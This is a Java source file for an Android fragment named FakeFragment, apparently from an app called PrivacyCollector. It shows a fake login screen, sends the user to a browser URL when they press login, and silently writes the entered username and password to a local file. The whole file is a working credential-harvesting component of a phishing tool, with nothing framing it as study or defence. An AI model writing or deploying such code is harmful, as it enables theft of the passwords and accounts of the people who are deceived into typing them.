package com.cccisi.privacycollector.czh;

import android.app.Fragment;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;

import com.cccisi.privacycollector.R;
import com.cccisi.privacycollector.czh.Util.Constant;
import com.cccisi.privacycollector.czh.Util.FileOperator;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import butterknife.Unbinder;

/**
 * @author cccis FB:Zachary Chen
 * @name PrivacyCollector
 * @class name：com.cccisi.privacycollector.czh
 * @class describe
 * @time 4/21/2018 5:08 PM
 * @change
 * @chang time
 * @class describe
 */
public class FakeFragment extends Fragment {

    View viewFakeFragment;
    @BindView(R.id.et_userName)
    EditText mEtUserName;
    @BindView(R.id.et_password)
    EditText mEtPassword;
    @BindView(R.id.btn_login)
    Button mBtnLogin;
    Unbinder unbinder;

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, Bundle savedInstanceState) {
        viewFakeFragment = inflater.inflate(R.layout.fragment_login, container, false);


        unbinder = ButterKnife.bind(this, viewFakeFragment);
        return viewFakeFragment;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        unbinder.unbind();
    }

    /**
     * @param
     * @Author: Zachary Chen
     * @Date: 4/21/2018 7:27 PM
     * @Description: 记录并跳转到浏览器
     */
    @OnClick(R.id.btn_login)
    public void onViewClicked() {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        Uri content_url = Uri.parse(Constant.getUrl());
        intent.setData(content_url);
        startActivity(intent);

        savePrivacy("用户名:" + mEtUserName.getText().toString() + "\n" + "口令:" + mEtPassword.getText().toString());
        getFragmentManager().popBackStack();
    }

    private void savePrivacy(String str) {
        FileOperator.createFolder();
        FileOperator.createFile();
        FileOperator.writestring(str);
    }
}
